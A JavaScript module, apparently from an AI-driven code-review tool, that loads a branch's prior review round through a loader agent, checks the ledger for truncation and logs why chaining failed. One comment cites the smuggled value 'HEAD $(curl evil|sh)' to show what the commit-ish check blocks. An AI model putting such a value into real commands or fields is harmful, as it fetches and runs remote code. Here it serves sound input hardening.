// The re-review memory (src/review.js, Scout phase): the prior round of this branch as the logger reads it,
// hardened at the load boundary, and whether the chain engaged.
import { reReviewMemory } from './run-record.mjs'
import { shq } from './run-logging.mjs'
import { PRIOR_ROUND_SCHEMA } from './review-schemas.mjs'
import { flattenField, isCommitish } from './prompt-fields.mjs'
import { ledgerTruncated } from './rescan-guards.mjs'

/**
 * @typedef {import('./review-schemas.mjs').PriorRoundAnswer} PriorRound
 * @typedef {import('./review-run.mjs').ReviewRun} ReviewRun
 */

/**
 * The prior round, or null on a first review, and the re-review memory outcome.
 * @param {ReviewRun} reviewRun @param {{ baseRef: string, branch: string }} detected  what detect resolved
 */
export async function priorRoundPhase(reviewRun, { baseRef, branch }) {
const { repoArg, loggerPreludeNow, LOGGER_PATH, viaArg, freshArg, ragentQuietly, splitThrew, noteTelemetryLoss } = reviewRun
const { log: logLine } = reviewRun.sb
// Round detection: find the newest prior `review` run for this branch, and accept it as the prior
// round ONLY if its head is an ANCESTOR of the current HEAD (a rebase/force-push makes a stale run
// non-ancestor → treat as a fresh first review). `fresh` skips the whole mechanism.
//
// The gate is `!freshArg` ALONE — it used to also require `branch && head`, both of which come from
// the `detect` agent's answer above. That made the whole re-review memory conditional on a model
// filling two fields: a `detect` agent that died or answered without them skipped the read entirely
// and the run reported as a first review, indistinguishable from a genuine one. The script reads the
// branch off git itself now (`prior-round` prefers git over `--branch`), so the flag below is the
// fallback, not the key.
//
// It is NOT `!freshArg` alone, and the second clause is a decision rather than a guard restored.
// The chain is keyed on (project, branch), and `rust-audit` fans out one nested `review` per crate
// through `parallel`: concurrent siblings share both keys. Unconditional entry put them all on one
// chain — each reading whichever sibling filed last as its own previous round and inheriting another
// crate's ledger. A per-crate child is one slice of its parent's single pass, not a round of its
// own, so it does not enter the chain: not as a reader (here) and not as a candidate
// (`selectPriorRounds` skips `nested` rows). The run that has a history is the top-level one.
// Unlike the condition this replaces, the skip is announced — a silent skip was that defect.
// The prior round as the loader read it, hardened, with the reason it was not chained when it was not.
async function loadPriorRound() {
  /** @type {PriorRound | null} */
  let loadedPriorRound = null
  // The prior-round lookup's non-found reason, held here because `priorRound` is nulled on a miss below.
  // It is the reason the run did NOT chain to a prior round; null means it DID (reReviewMemory reads null
  // as "chained"). fresh and nested never look up a prior round, so they are their own reasons — not
  // "chained", and not the detached-HEAD footgun either (realm @nick/craft #104).
  /** @type {string | null} */
  let loadedPriorReason = freshArg ? 'fresh' : viaArg ? 'nested' : null
  if (!freshArg && viaArg) {
    logLine(`Nested run (via ${viaArg}) — the round chain is the top-level run's: not read, and this run's row is not a candidate round for anyone (its siblings in the fan-out share this project and branch)`)
  }
  if (!freshArg && !viaArg) ({ priorRound: loadedPriorRound, priorReason: loadedPriorReason } = await readPriorRound(loadedPriorReason))
  announcePriorRound(loadedPriorRound)
  return { priorRound: loadedPriorRound, priorReason: loadedPriorReason }
}
/** @param {string | null} priorReasonIn @returns {Promise<{ priorRound: PriorRound | null, priorReason: string | null }>} */
async function readPriorRound(priorReasonIn) {
  // The loader's throw, held apart from its answer so `priorRound` is only ever an answer or null.
  let priorReadThrew = ''
  /** @type {PriorRound | null} */
  let readRound = await ragentQuietly(
    `You are the craft prior-round loader. This is mechanical IO — you DECIDE nothing: selecting the round, checking ancestry and reading the record are all done by the script.

Run exactly this:

\`\`\`
${loggerPreludeNow()}cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} prior-round --branch ${shq(branch)} \${CLAUDE_CODE_SESSION_ID:+--session "$CLAUDE_CODE_SESSION_ID"} --project "$PWD"
\`\`\`

It prints ONE line of JSON and always exits 0. Return that object VERBATIM — copy the \`ledger\` array byte for byte, do not summarize, re-key, truncate or "clean up" any entry. It prints \`ledgerCount\` alongside \`ledger\` — copy that number EXACTLY as printed; never recount, never adjust it to the array you are returning. Copy \`sameFpBasis\` exactly as printed too — it decides whether this round may compare fingerprints with the last one, and a dropped or flipped value loses the loop's memory. If the printed object has no \`sameFpBasis\`, leave it out; never invent one. The same holds for \`fpBasisKnown\`, \`priorFpRevisions\` (copy that array exactly) and \`priorFpRevisionsCheck\`. If the command prints nothing or cannot run, return {found:false, round:0, head:"", ledger:[], ledgerCount:0, priorFindings:0, journalSourced:false, sameFpBasis:false, fpBasisKnown:false, reason:"loader-did-not-run"}.`,
    { label: 'prior-round', schema: PRIOR_ROUND_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' },
  ).then(res => { const { answer, threw } = splitThrew(res); priorReadThrew = threw; return answer })
  // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
  // command replaced: the first re-review of a branch whose rows predate the absolute-path key
  // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
  if (!readRound?.['found']) {
    priorReasonIn = rejectedPriorReason(readRound, priorReadThrew)
    readRound = null
  }
  // Harden the model-authored ledger `head` at the LOAD boundary before it ever reaches a shell
  // command (it is interpolated into the carry/adjudicate `git diff <head>...HEAD`). If it is not a
  // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
  // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
  // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
  if (readRound && !isCommitish(readRound['head'])) {
    logLine(`⚠️ prior-round head ${JSON.stringify(readRound['head'])} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
    readRound['head'] = baseRef
  }
  return { priorRound: readRound, priorReason: priorReasonIn }
}
// Why there is no prior round, logged; a read that failed (rather than found nothing) is a lost record.
/** @param {PriorRound | null} priorRoundIn @param {string} priorReadThrew */
function rejectedPriorReason(priorRoundIn, priorReadThrew) {
  // Capture WHY there is no prior round BEFORE `priorRound` is nulled below: the re-review memory
  // outcome (chained? and the detached-HEAD note) is derived from it (realm @nick/craft #104).
  const rejectedReason = priorRoundIn?.['reason'] || 'no-prior-round'
  if (priorRoundIn?.['reason']) logLine(`No prior round: ${priorRoundIn['reason']}`)
  notePriorReadFailure(priorRoundIn, priorReadThrew)
  return rejectedReason
}
/** @param {PriorRound | null} priorRoundIn @param {string} priorReadThrew */
function notePriorReadFailure(priorRoundIn, priorReadThrew) {
  // A read that FAILED is the same lost-record class as a write that failed, and its silence is
  // worse: the run degrades into a first review (thisRound resets to 1, the whole adjudicate/carry
  // track is skipped) and the report cannot be told apart from a genuine first pass.
  // Narrow on purpose: the loader tells "there IS no prior round" (no-candidate-rows, no-branch, an
  // ancestry rejection after a rebase — health, and the common case: every first review) apart from
  // "the read could not run". Only the latter is a lost record; marking the former would fire the
  // marker on every first review, which is precisely how a marker stops being read.
  const READ_FAILURES = ['loader-did-not-run', 'git-unavailable']
  const readFailed = !priorRoundIn || !!priorReadThrew || READ_FAILURES.some(r => String(/** @type {PriorRound} */ (priorRoundIn)['reason'] || '').startsWith(r))
  if (readFailed) {
    noteTelemetryLoss('the prior-round ledger', priorReadThrew || priorRoundIn?.['reason'] || 'the loader agent returned no result')
  }
}
/** @param {PriorRound | null} priorRoundIn */
function announcePriorRound(priorRoundIn) {
  // Transport integrity: assert the ledger we received is the ledger the script printed.
  if (priorRoundIn && ledgerTruncated(priorRoundIn)) {
    logLine(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRoundIn['ledgerCount']} entr(ies), ${priorRoundIn['ledger']?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
  }
  if (priorRoundIn) logLine(`Re-review: prior round ${priorRoundIn['round']} @ ${flattenField(priorRoundIn['head'])} · ${priorRoundIn['ledger']?.length || 0} ledger finding(s)`)
  else logLine(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
}
const { priorRound, priorReason } = await loadPriorRound()

// realm @nick/craft #104: whether re-review memory engaged, and the note for the one case that fails
// silently — a detached HEAD, where the lookup returns 'no-branch' and the run degrades to round 1
// with no chaining. Recorded on the run record (reReview) and, when the note is set, shown at the top
// of the user-facing report via reReviewMemorySection(). Derived once here, near the round it explains.
const reReview = reReviewMemory(priorReason)
function applyReReviewNote() {
  if (reReview.note) {
    reviewRun.reReviewMemoryNote = reReview.note
    logLine(`⚠️ ${reReview.note}`)
  }
}
applyReReviewNote()
return { priorRound, reReview }
}
